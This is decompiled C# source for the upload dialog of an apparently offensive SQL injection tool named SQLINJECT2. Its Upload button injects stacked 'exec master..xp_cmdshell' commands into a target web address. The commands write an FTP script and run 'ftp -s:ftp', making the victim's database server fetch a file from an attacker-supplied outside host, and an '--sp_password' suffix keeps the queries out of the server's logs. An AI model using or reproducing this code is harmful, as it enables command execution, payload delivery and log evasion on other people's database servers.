using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace SQLINJECT2;

public class UploadForm : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private TextBox textBox1;

	private TextBox textBox2;

	private TextBox textBox3;

	private TextBox textBox4;

	private Button button1;

	private Button button2;

	private Button button3;

	private string weblink;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(UploadForm));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		textBox3 = new TextBox();
		textBox4 = new TextBox();
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(1, 22));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(70, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("FTP Server : ");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(1, 57));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(61, 13));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Username :");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(1, 90));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(59, 13));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Password :");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(1, 125));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(29, 13));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("File :");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_ForeColor(Color.Red);
		((Control)label5).set_Location(new Point(-2, 193));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(299, 78));
		((Control)label5).set_TabIndex(4);
		((Control)label5).set_Text(componentResourceManager.GetString("label5.Text"));
		((Control)textBox1).set_Location(new Point(77, 15));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(213, 20));
		((Control)textBox1).set_TabIndex(5);
		((Control)textBox2).set_Location(new Point(77, 49));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(213, 20));
		((Control)textBox2).set_TabIndex(6);
		((Control)textBox3).set_Location(new Point(77, 83));
		((Control)textBox3).set_Name("textBox3");
		textBox3.set_PasswordChar('*');
		((Control)textBox3).set_Size(new Size(213, 20));
		((Control)textBox3).set_TabIndex(7);
		((Control)textBox4).set_Location(new Point(77, 118));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(213, 20));
		((Control)textBox4).set_TabIndex(8);
		((Control)button1).set_Location(new Point(4, 160));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(9);
		((Control)button1).set_Text("Upload");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_Location(new Point(110, 160));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(10);
		((Control)button2).set_Text("Reset");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_Location(new Point(215, 160));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(11);
		((Control)button3).set_Text("Close");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 277));
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("UploadForm");
		((Control)this).set_Text("Upload file lên server");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public UploadForm()
	{
		InitializeComponent();
	}

	private bool GetHtmlSource(out string responseString, Uri requestURI)
	{
		HttpWebResponse httpWebResponse = null;
		WebProxy proxy = null;
		Stream stream = null;
		MemoryStream memoryStream = null;
		MemoryStream memoryStream2 = null;
		bool result = false;
		responseString = "";
		requestURI = null;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(weblink);
			httpWebRequest.Accept = "*/*";
			httpWebRequest.Headers.Add("Accept-Language", "en-us");
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3";
			httpWebRequest.Method = "GET";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.Proxy = proxy;
			httpWebRequest.Timeout = (int)new TimeSpan(0, 0, 60).TotalMilliseconds;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				_ = httpWebResponse.CharacterSet;
				stream = httpWebResponse.GetResponseStream();
				result = true;
			}
			catch (WebException ex)
			{
				result = false;
				if (ex.Response == null)
				{
					stream = null;
					responseString = "<html><body>" + ex.Message + "</body></html>";
					return result;
				}
				stream = ex.Response!.GetResponseStream();
			}
			finally
			{
				requestURI = httpWebRequest.RequestUri;
			}
			if (stream != null)
			{
				memoryStream = new MemoryStream();
				memoryStream2 = new MemoryStream();
				Utilities.CopyStream(stream, memoryStream);
				memoryStream.Position = 0L;
				Utilities.CopyStream(memoryStream, memoryStream2);
				responseString = Utilities.GetStreamHTMLData(memoryStream, null, supportSeek: true);
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
		finally
		{
			stream?.Close();
			memoryStream?.Close();
			memoryStream2?.Close();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text("");
		((Control)textBox2).set_Text("");
		((Control)textBox3).set_Text("");
		((Control)textBox4).set_Text("");
	}

	private void button3_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		Uri requestURI = null;
		string responseString = "";
		weblink = MainForm.address1 + ";exec master..xp_cmdshell 'echo open " + ((Control)textBox1).get_Text() + " >ftp'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = MainForm.address1 + ";exec master..xp_cmdshell 'echo user " + ((Control)textBox2).get_Text() + " " + ((Control)textBox3).get_Text() + ">>ftp'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = MainForm.address1 + ";exec master..xp_cmdshell 'echo get " + ((Control)textBox4).get_Text() + ">>ftp'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = MainForm.address1 + ";exec master..xp_cmdshell 'echo quit>>ftp'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = MainForm.address1 + ";exec master..xp_cmdshell 'ftp -v -i -n -s:ftp'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		MainForm.load = 1;
	}
}
